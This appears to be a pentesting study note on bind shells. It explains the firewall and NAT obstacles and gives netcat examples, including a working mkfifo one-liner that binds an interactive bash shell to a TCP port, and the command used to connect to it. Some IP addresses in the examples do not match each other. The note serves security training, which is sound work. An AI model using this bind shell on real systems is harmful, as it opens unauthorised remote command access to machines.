# Bind shell
With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box).

## Challanges with Bind Shells:
- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

## Example

### Send something with netcat
```shell
# Target starting Netcat listener
nc -lvnp 7777

# Attacker connecting to the target
nc -nv 10.129.41.200 7777

#we will see 
# on Attacker Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
# on Target Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

### Establishing a Basic Bind Shell with Netcat
```shell
# on target Binding a Bash shell to the TCP session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

# Connecting to bind shell on target
nc -nv 10.129.201.134 7777
```